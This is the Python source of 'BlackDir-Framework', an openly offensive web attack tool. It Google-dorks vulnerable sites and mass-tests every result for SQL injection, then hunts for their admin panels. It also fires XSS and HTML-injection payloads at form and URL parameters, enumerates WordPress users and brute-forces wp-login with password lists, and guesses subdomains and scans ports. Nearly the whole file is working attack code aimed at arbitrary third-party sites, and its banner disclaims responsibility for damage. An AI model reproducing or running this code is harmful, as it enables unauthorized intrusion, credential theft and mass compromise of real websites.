"""
    BlackDir-Framework Project
    author:RedVirus Twitter:Je_1r insta:redvirus_0 
    author:Ali Twitter:bc_zQ

    Thx for all use this project


"""
import time
from urllib import request
import json
from hashlib import *
from urllib.parse import urlsplit
import urllib.parse as urlparse
from urllib.parse import parse_qs
import os
from socket import gethostbyname
try:
    from bs4 import BeautifulSoup
except:
    os.system("clear")
    print(colored("\nPlease Install bs4 library command install:\npip3 install bs4", "red"))
    exit()

# ----------------------------------
try:
    from termcolor import colored
except:
    os.system("clear")
    print(colored("\nPlease Install termcolor library command install:\npip3 install termcolor", "red"))
    exit()

# --------------------------------

try:
    import requests
except:
    os.system("clear")
    print(colored("\nPlease Install requests library command install:\npip3 install requests", "red"))
    exit()

# --------------------------------

try:
    import argparse
except:
    os.system("clear")
    print(colored("\nPlease Install argparse library command install:\npip3 install argparse", "red"))
    exit()

# --------------------------------

try:
    import googlesearch
except:
    os.system("clear")
    print(colored("\nPlease Install google library command install:\npip3 install google", "red"))
    exit()


def logo():
    print("""
\x1b[34m
  ____  _            _    _____  _        ______                                           _    
 |  _ \| |          | |  |  __ \(_)      |  ____|                                         | |   
 | |_) | | __ _  ___| | _| |  | |_ _ __  | |__ _ __ __ _ _ __ ___   _____      _____  _ __| | __
 |  _ <| |/ _` |/ __| |/ / |  | | | '__| |  __| '__/ _` | '_ ` _ \ / _ \ \ /\ / / _ \| '__| |/ /
 | |_) | | (_| | (__|   <| |__| | | |    | |  | | | (_| | | | | | |  __/\ V  V / (_) | |  |   < 
 |____/|_|\__,_|\___|_|\_\_____/|_|_|    |_|  |_|  \__,_|_| |_| |_|\___| \_/\_/ \___/|_|  |_|\_\ version:2.8

 -----------------------------------------------------------------------------------------------------------
    The Programmer of this tool is not irresponsible about any damage Or leak induced by the user
 -----------------------------------------------------------------------------------------------------------
 
help: python3 BlackDir.py -h
                                                                                                                
""")


def fast_crawl(url):
    global list_direct, url_access, url_source
    ip = url.strip("https://www.")
    print("Domain:",url)
    print("IP:",gethostbyname(ip))
    list_direct = []
    url_strip = url.strip("https://www.")
    headers = {"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0"}
    list_direct.append(url)
    url_request = requests.get(url, headers=headers)
    url_source = BeautifulSoup(url_request.content, "html.parser")
    for link in url_source.find_all("a"):
        link_pure = link.get("href")
        try:
            if "#" in link_pure or "../" in link_pure or "facebook.com" in link_pure or "@" in link_pure:
                pass
            else:
                if "http" not in link_pure and "https" not in link_pure and url_strip not in link_pure:
                    try:
                        first_req = requests.get(url + link_pure)
                        if first_req.status_code == 200:
                            print(colored("================================================================", "green"))
                            print(colored("Url:", "green"), url + link_pure)
                            print(colored("Request:", "green"), first_req.status_code)
                            print(colored("================================================================", "green"))
                            list_direct.append(url + link_pure)
                        else:
                            pass
                    except requests.exceptions.ConnectionError:
                        pass
                else:
                    if "http" in link_pure or "https" in link_pure and url_strip in link_pure:
                        try:
                            sec_req = requests.get(link_pure)
                            if sec_req.status_code == 200:
                                if sec_req.url not in list_direct:
                                    print(colored("================================================================",
                                                  "green"))
                                    print(colored("Url:", "green"), link_pure)
                                    print(colored("Request:", "green"), sec_req.status_code)
                                    print(colored("================================================================",
                                                  "green"))
                                    list_direct.append(link_pure)
                            else:
                                pass
                        except requests.exceptions.ConnectionError:
                            pass
                    elif "http" not in link_pure or "https" not in link_pure and url_strip in link_pure:
                        try:
                            third_req = requests.get("http://" + link_pure)
                            if third_req.status_code == 200:
                                if third_req.url not in list_direct:
                                    print(colored("================================================================",
                                                  "green"))
                                    print(colored("Url:", "green"), third_req.url)
                                    print(colored("Request:", "green"), third_req.status_code)
                                    print(colored("================================================================",
                                                  "green"))
                                    list_direct.append("http://" + link_pure)
                            else:
                                pass
                        except requests.exceptions.ConnectionError:
                            pass
                    else:
                        try:
                            fourth_req = requests.get(link_pure)
                            if fourth_req.status_code == 200:
                                if fourth_req.url not in list_direct:
                                    print(colored("================================================================",
                                                  "green"))
                                    print(colored("Url:", "green"), fourth_req.url)
                                    print(colored("Request:", "green"), fourth_req.status_code)
                                    print(colored("================================================================",
                                                  "green"))
                                    list_direct.append(fourth_req.url)
                            else:
                                pass
                        except requests.exceptions.ConnectionError:
                            pass
        except:
            pass
    for url_form_list in list_direct:
        sec_url_request = requests.get(url_form_list)
        soup = BeautifulSoup(sec_url_request.content, "html.parser")
        for sec_link in soup.find_all("a"):
            sec_link = sec_link.get("href")
            try:
                if "#" in sec_link or "./" in sec_link:
                    pass
                else:
                    if url_strip not in sec_link:
                        pass
                    else:
                        if "http" not in sec_link or "https" not in sec_link and url_strip in sec_link:
                            try:
                                five_req = requests.get("http://" + sec_link)
                                if five_req.status_code == 200:
                                    if five_req.url not in list_direct:
                                        print(
                                            colored("================================================================",
                                                    "green"))
                                        print(colored("Url:", "green"), five_req.url)
                                        print(colored("Request:", "green"), five_req.status_code)
                                        print(
                                            colored("================================================================",
                                                    "green"))
                                        list_direct.append(five_req.url)
                                else:
                                    pass
                            except:
                                pass
                        else:
                            try:
                                six_req = requests.get(sec_link)
                                if six_req.status_code == 200:
                                    if six_req.url not in list_direct:
                                        print(
                                            colored("================================================================",
                                                    "green"))
                                        print(colored("Url:", "green"), six_req.url)
                                        print(colored("Request:", "green"), six_req.status_code)
                                        print(
                                            colored("================================================================",
                                                    "green"))
                                        list_direct.append(six_req.url)
                                else:
                                    pass
                            except:
                                pass
            except:
                pass


def admin_panel(url):
    file_fromat = open("link.txt", "r")
    try:
        for link in file_fromat:
            Purl = url + "/" + link
            if Purl == None:
                exit()
            req_link = requests.get(Purl)
            if req_link.status_code == 200:
                print(colored("[+]Found: ", "green"), Purl)
            else:
                print(colored("[-]Not Found: ", "red"), Purl)
    except requests.exceptions.ConnectionError:
        pass


def sql(url):  # Function F0r find Sql_Injection

    try:
        parametrs = []
        after_eq = []
        get = {}
        query = urlsplit(url).query
        dictonary = parse_qs(query)
        key = list(dictonary.keys())
        value = list(dictonary.values())
        for par in key:
            parametrs.append(par)
        for equal in value:
            for number in equal:
                after_eq.append(number + "'")
        for pars in parametrs:
            for eq in after_eq:
                get = {pars: eq}
        get_list = list(get)
        for item in get_list:
            item = item.strip()
            if item != None:
                req = requests.get(url, params=get)
                if "Warning" in req.text or "Database error" in req.text or "MySQL error" in req.text or "SQL syntax" in req.text:
                    print(colored("================================================================", "green"))
                    print(colored("SQL Injection", "red"), colored("Type:Union Based", "grey"))
                    print(colored("Url Vulnerable:", "green"), colored(req.url, "red"))
                    print(colored("================================================================", "green"))
                    url_sql.append(req.url)
                else:
                    print(colored("================================================================", "green"))
                    print(colored("Url Not Vulnerable:", "green"), colored(req.url, "red"))
                    print(colored("================================================================", "green"))
            else:
                pass
    except:
        pass


def xss(url):  # Function FOr Find xss vulnerability
    # GET Method
    try:
        GET = {}
        file = open("xss_payloads.txt", "r")
        parsed = urlparse.urlparse(url)
        params = urlparse.parse_qsl(parsed.query)
        print(colored("Parameters in Link:","red"),colored(params[0],"green"))
        print(colored("Please wait we check if parameters vulnerable ","red"))
        time.sleep(5)
        for payload in file:
            payload = payload.strip()
            for par, equeal in params:
                GET = {par: payload}
                check_req = requests.get(url, params=GET)
                if payload in check_req.text:
                    time.sleep(2)
                    print(colored("=========================================================", "green"))
                    print(colored("Url:", "green"), colored(url, "blue"))
                    print(colored("Method:", "green"), colored("GET", "red"))
                    print(colored("Url Vulnerable", "red"), check_req.url)
                    print(colored("Parameter Vulnerable:", "red"), par)
                    print(colored("Payload:", "red"), payload)
                    print(colored("=========================================================", "green"))
                else:
                    time.sleep(2)
                    print(colored("=========================================================", "green"))
                    print(colored("Url:", "green"), colored(url, "blue"))
                    print(colored("Method:", "green"), colored("GET", "red"))
                    print(colored("Url Not Vulnerable", "green"), check_req.url)
                    print(colored("Parameter Not Vulnerable:", "green"), par)
                    print(colored("Payload:", "red"), payload)
                    print(colored("=========================================================", "green"))
        file.close()
    except:
        pass
    # Post Method
    try:
        POST = {}
        New_open = open("xss_payloads.txt")
        request_form = request.urlopen(url).read()
        source = BeautifulSoup(request_form, "html.parser")
        for payloads in New_open:
            for form in source.findAll("input"):
                if form.get('type') == "submit":
                    input_submit = form.get('name')
                    POST[input_submit] = payloads
                if form.get('type') == 'text':
                    input_name = form.get('name')
                    POST[input_name] = payloads
            sec_check_req = requests.post(url, POST)
            if payloads in sec_check_req.text:
                time.sleep(2)
                print(colored("=========================================================", "green"))
                print(colored("Url:", "green"), colored(url, "blue"))
                print(colored("Method:", "green"), colored("POST", "red"))
                print(colored("Url Vulnerable", "red"), sec_check_req.url)
                print(colored("Parameter Vulnerable:", "red"), input_name)
                print(colored("Payload:", "red"), payloads)
                print(colored("=========================================================", "green"))
            else:
                time.sleep(2)
                print(colored("=========================================================", "green"))
                print(colored("Url:", "green"), colored(url, "blue"))
                print(colored("Method:", "green"), colored("POST", "red"))
                print(colored("Url Not Vulnerable", "green"), sec_check_req.url)
                print(colored("Parameter Not Vulnerable:", "green"), input_name)
                print(colored("=========================================================", "green"))


        New_open.close()
    except:
        pass


def httplive(url):
    global live
    live = None
    bool(live)
    try:
        request_live = requests.get(url)
        if request_live.status_code == 200:
            print(colored("Http Live : ", "green"), url)
            live = 1
    except requests.exceptions.ConnectionError:
        print(colored("Http Down : ", "red"), url)
        live = 0


def spider(url, lists, secure):
    print(colored("Please Wait We Check if URL Live or Down . . ", "green"))
    time.sleep(3)
    httplive(url)
    if live == 1:
        if secure == "list.txt":
            print(colored("Please Wait We Spider all Directories . .", "red"))
            time.sleep(3)
            fast_crawl(url)
            print(colored("We Crawling By This File >>" + os.getcwd() + "/" + "list.txt", "green"))
            for i in lists:
                i = i.strip()
                Purl = url + "/" + i
                response = requests.get(Purl)
                if response.status_code == 200:
                    print("\x1b[32mFound[+]")
                    print(response.url)
                else:
                    pass
        else:
            fast_crawl(url)
            print(colored("We Crawling By This File >>" + listuser, "green"))
            for i in lists:
                i = i.strip()
                Purl = url + "/" + i
                response = requests.get(Purl)
                if response.status_code == 200:
                    print("\x1b[32mFound[+]")
                    print(response.url)
                else:
                    pass
    else:
        pass

def html_injection(url):
    # GET
    try:
        file = open("html_payloads.txt", "r")
        GET = {}
        parsed = urlparse.urlparse(url)
        params = urlparse.parse_qsl(parsed.query)
        for payload in file:
            payload = payload.strip()
            for par,equal in params:
                print(colored(par,"green"),"=",colored(equal,"green"))
                GET={par:payload}
                req = requests.get(url,params=GET)
                if payload in req.text:
                    print(colored("=========================================================", "green"))
                    print(colored("Url:", "green"), colored(url, "blue"))
                    print(colored("Method:", "green"), colored("GET", "red"))
                    print(colored("Url Vulnerable", "red"), req.url)
                    print(colored("Parameter:", "red"), par)
                    print(colored("Payload:", "red"), payload)
                    print(colored("=========================================================", "green"))
        file.close()

    except:
        pass
    #POST
    try:
        POST = {}
        file_payloads = open("html_payloads.txt")
        request_form = request.urlopen(url).read()
        source = BeautifulSoup(request_form, "html.parser")
        for payload in file_payloads:
            for form in source.findAll("input"):
                if form.get('type') == "submit":
                    input_submit = form.get('name')
                    POST[input_submit] = payload
                if form.get('type') == 'text':
                    input_name = form.get('name')
                    POST[input_name] = payload
            req_check = requests.post(url, POST)
            if payload in req_check.text:
                print(colored("=========================================================", "green"))
                print(colored("Url:", "green"), colored(url, "blue"))
                print(colored("Method:", "green"), colored("POST", "red"))
                print(colored("Url Vulnerable", "red"), req_check.url)
                print(colored("Parameter:", "red"), input_name)
                print(colored("Payload:", "red"), payload)
                print(colored("=========================================================", "green"))
        file_payloads.close()
    except:
        pass


def dorks(dork, country, text):  # function for Get Dork
    global url_sql
    url_sql = []

    print(colored("Please Wait .. ", "red"))
    if country != None and text == None:
        docker = "inurl:" + dork + " site:" + country
    elif country == None and text != None:
        docker = "inurl:" + dork + " intext:" + text
    elif country != None and text != None:
        docker = "inurl:" + dork + " site:" + country + " intext:" + text
    else:
        docker = "inurl:" + dork
    list_of_url = []
    results = []
    user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0"
    headers = {'user-agent': user_agent}
    link = "https://google.com/search?q=" + docker
    rep = requests.get(link, headers=headers)
    if rep.status_code == 200:
        soup = BeautifulSoup(rep.content, "html.parser")
    for g in soup.find_all('div', class_='r'):
        anchors = g.find_all('a')
        if anchors:
            link = anchors[0]['href']
            title = g.find('h3').text
            item = {
                "title": title,
                "link": link
            }
            results.append(item)
    for dic in results:
        list_of_link = list(dic.values())
        print("\n")
        print(colored("Title Of Link:", "green"), list_of_link[0], "\n")
        print(colored("Link:", "green"), list_of_link[1], "\n")
        list_of_url.append(list_of_link[1])
    file_dork = open("Site_From_Dork.txt","w")
    for url_find in list_of_url:
        file_dork.write(url_find+"\n")
    file_dork.close()
    print(colored("All Site Save On: ","red"),colored(os.getcwd()+"/"+"Site_From_Dork.txt","green"))
    line = input(colored("You Want Scan All URLs [Sql Injection] [Y/N]: ", "green"))
    if line == "Y" or line == "y" or line == None:
        for urls in list_of_url:
            sql(urls)
    else:
        pass
    if url_sql != []:
        line_user = input(colored("Do you want find The panel of URLs vulnerable [Y/N] : ","green"))
        if line_user == 'y' or line_user == 'n' or line_user == "Y" or line_user == "N":
            for url_find in url_sql:
                url_find = url_find.strip("https://www.")
                url_find = url_find[0:url_find.index("/")]
                url_find = "http://"+url_find
                try:
                    file_admin = open("link.txt","r")
                    for direct in file_admin:
                        direct = direct.strip()
                        req_admin = requests.get(url_find+"/"+direct)
                        if req_admin.status_code == 200:
                            print(colored("[+] Found : {0}","green").format(req_admin.url))
                        else:
                            print(colored("[-] Not Found : {0}","red").format(req_admin.url))
                except requests.exceptions.ConnectionError:
                    pass
        else:
            pass
    else:
        pass



def list_dorks(file):
    handle = open(file, "r")
    user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0"
    headers = {'user-agent': user_agent}
    result = []
    url_hand = []
    for dork in handle:
        print(colored("========================================", "green"))
        print(colored("Dork:", "green"), colored(dork, "red"))
        print(colored("========================================", "green"))
        time.sleep(2)
        link = "https://google.com/search?q=" + dork
        rep = requests.get(link, headers=headers)
        if rep.status_code == 200:
            soup = BeautifulSoup(rep.content, "html.parser")
        for g in soup.find_all('div', class_='r'):
            anchors = g.find_all('a')
            if anchors:
                link = anchors[0]['href']
                title = g.find('h3').text
                item = {
                    "title": title,
                    "link": link
                }
                result.append(item)
                for dict in result:
                    list_link = list(dict.values())
                    print("\n")
                    print(colored("Title Of Link:", "green"), list_link[0], "\n")
                    print(colored("Link:", "green"), list_link[1], "\n")
                    url_hand.append(list_link[1])
    user = input(colored("You Want Scan All URLs [Sql Injection] [Y/N] : ", "green"))
    if user == "Y" or user == "y" or user == None:
        for urls in url_hand:
            sql(urls)
    else:
        pass

def sub(url, subs):  # function for gussing subdomain
    if "https" in url:
        url = url.strip("https://")
    elif "http" in url:
        url = url.strip("http://")
    for i in subs:
        i = i.strip()
        Purl = i + "." + url
        try:
            response = requests.get("http://" + Purl)
            if response.status_code == 200:
                print(colored("=========================================================", "green"))
                print(colored("Url:http://{0}", "green").format(Purl))
                print(colored("Status_Code:","red"),colored(200,"green"))
                print(colored("=========================================================", "green"))
            else:
                pass
        except:
            pass


def ip_reverse(ip):
    try:
        url = ("https://api.hackertarget.com/reverseiplookup/?q=")
        url_ip = url + ip
        req = requests.get(url_ip)
        response = req.text
        print(colored(response, "blue"))
    except requests.exceptions.ConnectionError:
        print(colored("Connection Fail", "blue"))


def scanports(ip):
    try:
        api = "https://api.hackertarget.com/nmap/?q="
        new_api = api + ip
        req_api = requests.get(new_api)
        print(req_api.text)
    except:
        pass


def update():
    os.system(
        "cd .. && rm -rf BlackDir-Framework-New && mkdir BlackDir-Framework-New && cd BlackDir-Framework-New && git clone https://github.com/RedVirus0/BlackDir-Framework.git && echo 'New Directory >> ' && pwd")

def hash_en(word,hash_type):
    word = word.strip()
    hash_type = hash_type.strip()
    if hash_type == "md5":
        word = md5(word.encode()).hexdigest()
        print(colored("Type: ","red"),hash_type)
        print(colored("Hash :","green"),word)
    elif hash_type == "sha1":
        word = sha1(word.encode()).hexdigest()
        print(colored("Type: ","red"),hash_type)
        print(colored("Hash :","green"),word)
    elif hash_type == "sha256":
        word = sha256(word.encode()).hexdigest()
        print(colored("Type: ", "red"), hash_type)
        print(colored("Hash :", "green"), word)
    elif hash_type == "sha512":
        word = sha512(word.encode()).hexdigest()
        print(colored("Type: ", "red"), hash_type)
        print(colored("Hash :", "green"), word)
    elif hash_type == "sha224":
        word = sha224(word.encode()).hexdigest()
        print(colored("Type: ", "red"), hash_type)
        print(colored("Hash :", "green"), word)
    elif hash_type == "sha384":
        word = sha384(word.encode()).hexdigest()
        print(colored("Type: ", "red"), hash_type)
        print(colored("Hash :", "green"), word)
    elif hash_type == "md4":
        word = new('md4', word.encode()).hexdigest()
        print(colored("Type: ", "red"), hash_type)
        print(colored("Hash :", "green"), word)
def hash_identifier(hashing):
    hashing = hashing.strip()
    if len(hashing) == 32:
        print(colored("Hash Type:","green"),colored("md5 or md4","red"))
        print(colored("Bit length:","green"),32*4)
    elif len(hashing) == 40:
        print(colored("Hash Type:","green"),colored("sha1","red"))
        print(colored("Bit length:","green"),40*4)
    elif len(hashing) == 64:
        print(colored("Hash Type:", "green"), colored("sha256", "red"))
        print(colored("Bit length:"),64*4)
    elif len(hashing) == 96:
        print(colored("Hash Type:", "green"), colored("sha384", "red"))
        print(colored("Bit length:"), 96 * 4)
    elif len(hashing) == 56:
        print(colored("Hash Type:", "green"), colored("sha224", "red"))
        print(colored("Bit length:"), 56 * 4)
    elif len(hashing) == 128:
        print(colored("Hash Type:", "green"), colored("sha512", "red"))
        print(colored("Bit length:"), 128 * 4)
    else:
        print(colored("Not Found !","red"))
def enumerate(url):
    try:
        req_check = requests.get(url)
        if req_check.status_code == 200:
            u_json = json.loads(req_check.text)
            for x in range(0,len(u_json)):
                user=u_json[x]['slug']
            return user
        else:
            return None
    except requests.exceptions.ConnectionError:
        return None
def wordpress(url,username,password,enum):
    user_list=[]
    send = {}
    user = None
    user_json = url+"/wp-json/wp/v2/users"
    print(colored("[!] Start Brute Force","red"))

    time.sleep(2)
    if enum == "use" or "Use":
        user =enumerate(user_json)
        print(colored("[!] Start Enumeration", "red"))
    if user!=None and password == None :
        user_list.append(user)
        print(colored("[+] Found User:","green"),user)
        p_file = open("password.txt", "r")
        print(colored("File For Passwords:", "green"), os.getcwd() + "/" + "password.txt")
    elif user != None and password != None:
        user_list.append(user)
        print(colored("[+] Found User:","green"),user)
        p_file = open(password, "r")
        print(colored("File For Passwords:", "green"), password)
    else:
        if username ==None and password == None:
            user_list = open("username.txt", "r")
            p_file = open("password.txt", "r")
            print(colored("File For Users:","green"), os.getcwd()+"/"+"username.txt")
            print(colored("File For Users:","green"),os.getcwd()+"/"+"password.txt")
        elif username != None and password == None:
            user_list = open(username,"r")
            p_file = open("password.txt", "r")
            print(colored("File For Users:","green"),username)
            print(colored("File For Users:","green"), os.getcwd()+"/"+ "password.txt")
        elif username == None and password !=None:
            user_list = open("username.txt", "r")
            p_file = open(password,"r")
            print(colored("File For Users:","green"), os.getcwd()+"/"+"username.txt")
            print(colored("File For Users:","green"),password)
        else:
            user_list = open(username, "r")
            p_file = open(password, "r")
            print(colored("File For Users:","green"),username)
            print(colored("File For Users:","green"),password)
    time.sleep(2)
    url_edit = url+"/"+"wp-login.php"
    wp_admin = url+"/"+"wp-admin"

    url_req = requests.post(url_edit)
    if url_req.status_code == 200:
        for usernames in user_list:
            usernames = usernames.strip()
            for passowrds in p_file:
                passowrds = passowrds.strip()
                url_source = BeautifulSoup(url_req.content,"html.parser")
                for url_input in url_source.find_all("input"):
                    if url_input.get("type") == "text":
                        input_text_name= url_input.get("name")
                        send[input_text_name] = usernames
                    if url_input.get("type") == "password":
                        input_password_name = url_input.get("name")
                        send[input_password_name]= passowrds
                    if url_input.get("type") == "submit":
                        input_submit_name = url_input.get("name")
                        input_submit_value = url_input.get("value")
                        send[input_submit_name] = input_submit_value
                with requests.Session() as sessions:
                    headers1 = {'Cookie': 'wordpress_test_cookie=WP Cookie check'}
                    sessions.post(url_edit,headers=headers1,data=send)
                    response = sessions.get(wp_admin)
                if url+"/wp-login.php?action=lostpassword" not in response.text:
                    print("Found !","Username:",usernames,"password:",passowrds)
                    exit(0)
                else:
                    print(colored("Not Found !","red"),"Username:",usernames,"password:",passowrds)

    else:
        print(colored("URL is Wrong !","red"))
        exit(1)
parser = argparse.ArgumentParser("""
--spider            : Url to find Directory
--list              : If you have list
--dork              : Dump all sites by dork
--country           : find Dork By Country
--text              : Dump site text if in site
--subdomain         : find SubDomain of site
--xss               : Scan Site if vulnerable [Xss] url must be between double citation
--sql               : Scan Site if vulnerable [Sql] url must be between double citation
--HTMLinj           : Scan site if vulnerable [html injection] url must be between double citation
--listDork          : Scan list Dorks if Vulnerable [Sql]
--RevIP             : Dump all site by ip
--port              : Scan ports by ip
--update            : Update Tool ex: --update check
--word              : word you want encrypt
--type              : select hash type like:md5,sha1,sha256,sha512
--hash_type         : find Type of hash
--wordpress         : link the site for BruteForce
--ListPassword      : Directory For Your Password List
--ListUsername      : Directory For Your Username List
--enum              : Wordpress User Enumerate 

ex:
python3 BlackDir.py --spider http://google.com
python3 BlackDir.py --dork inurl:admin/login.php --country sa --text product
python3 BlackDir.py --xss "paste url here"
python3 BlackDir.py --sql "paste url here"
python3 BlackDir.py --subdomain google.com
python3 BlackDir.py --RevIP [ip address of server]
python3 BlackDir.py --word redvirus --type md4
python3 BlackDir.py --word redvirus --type md5
python3 BlackDir.py --word redvirus --type sha1
python3 BlackDir.py --word redvirus --type sha256
python3 BlackDir.py --word redvirus --type sha512
python3 BlackDir.py --hash_type 5f4dcc3b5aa765d61d8327deb882cf99
python3 BlackDir.py --wordpress http://ebase.com/
python3 BlackDir.py --wordpress http://ebase.com/ --ListUsername /root/Desktop/users.txt --ListPassowrd /root/Desktop/pass.txt
python3 BlackDir.py --wordpress http://ebase.com/ --ListUsername /root/Desktop/users.txt 
python3 BlackDir.py --wordpress http://ebase.com/ --ListPassword /root/Desktop/pass.txt
python3 BlackDir.py --wordpress https://everythingrevelstoke.com --enum use



""")
parser.add_argument("-spider", "--spider")
parser.add_argument("-list", "--list")
parser.add_argument("-dork", "--dork")
parser.add_argument("-country", "--country")
parser.add_argument("-subdomain", "--subdomain")
parser.add_argument("-xss", "--xss")
parser.add_argument("-text", "--text")
parser.add_argument("-sql", "--sql")
parser.add_argument("-HTMLinj","--HTMLinj")
parser.add_argument("-listDork", "--listDork")
parser.add_argument("-update", "--update")
parser.add_argument("-RevIP", "--RevIP")
parser.add_argument("-port", "--port")
parser.add_argument("-type","--type")
parser.add_argument("-word","--word")
parser.add_argument("-hash_type","--hash_type")
parser.add_argument("-wordpress","--wordpress")
parser.add_argument("-ListUsername","--ListUsername")
parser.add_argument("-ListPassword","--ListPassword")
parser.add_argument("-enum","--enum")
args = parser.parse_args()
secure = None
listuser = args.list
if listuser != None:
    listuser = args.list
    secure = None
elif listuser == None:
    listuser = open("list.txt", "r")
    secure = "list.txt"
ip = args.RevIP
portscan = args.port
dork = args.dork
country = args.country
url = args.spider
subdomains = args.subdomain
scanner = args.xss
text = args.text
sql_inection = args.sql
list_dork = args.listDork
updates = args.update
html = args.HTMLinj
sublist = open("sub.txt", "r")
site = args.country
hash_type = args.type
user_word = args.word
hash_ide = args.hash_type
url_wordpress = args.wordpress
usernames = args.ListUsername
passwords = args.ListPassword
enumx = args.enum
if dork != None and url == None and subdomains == None and scanner == None and sql_inection == None and list_dork == None and updates == None and ip == None and portscan == None and html == None and hash_type == None and user_word ==None and hash_ide == None and url_wordpress ==None:
    dorks(dork, site, text)
elif url != None and dork == None and subdomains == None and scanner == None and sql_inection == None and list_dork == None and updates == None and ip == None and portscan == None and html == None and hash_type == None and user_word ==None and hash_ide == None and url_wordpress ==None:
    spider(url, listuser, secure)
elif subdomains != None and url == None and dork == None and scanner == None and sql_inection == None and list_dork == None and updates == None and ip == None and portscan == None and html == None and hash_type == None and user_word ==None and hash_ide == None and url_wordpress ==None:
    sub(subdomains, sublist)
elif scanner != None and url == None and dork == None and subdomains == None and sql_inection == None and list_dork == None and updates == None and ip == None and portscan == None and html == None and hash_type == None and user_word ==None and hash_ide == None and url_wordpress ==None:
    xss(scanner)
elif sql_inection != None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates == None and ip == None and portscan == None and html == None and hash_type == None and user_word ==None and hash_ide == None and url_wordpress ==None:
    sql(sql_inection)
elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork != None and updates == None and ip == None and portscan == None and html == None and hash_type == None and user_word ==None and hash_ide == None and url_wordpress ==None:
    list_dorks(list_dork)
elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates != None and ip == None and portscan == None and html == None and hash_type == None and user_word ==None and hash_ide == None and url_wordpress ==None:
    if updates == "check" or updates == "Check":
        update()
    else:
        print(colored("Error ! Please Enter --update check", "red"))
elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates == None and ip != None and portscan == None and html == None and hash_type == None and user_word ==None and hash_ide == None and url_wordpress ==None:
    ip_reverse(ip)
elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates == None and ip == None and portscan != None and html == None and hash_type == None and user_word ==None and hash_ide == None and url_wordpress ==None:
    scanports(portscan)
elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates == None and ip == None and portscan == None and html != None and hash_type == None and user_word ==None and hash_ide == None and url_wordpress ==None:
    html_injection(html)
elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates == None and ip == None and portscan == None and html == None and hash_type != None and user_word !=None and hash_ide == None and url_wordpress ==None:
    hash_en(user_word,hash_type)
elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates == None and ip == None and portscan == None and html == None and hash_type == None and user_word == None and hash_ide != None and url_wordpress ==None:
    hash_identifier(hash_ide)
elif sql_inection == None and scanner == None and url == None and dork == None and subdomains == None and list_dork == None and updates == None and ip == None and portscan == None and html == None and hash_type == None and user_word == None and hash_ide == None and url_wordpress !=None:
    wordpress(url_wordpress,usernames,passwords,enumx)
else:
    logo()
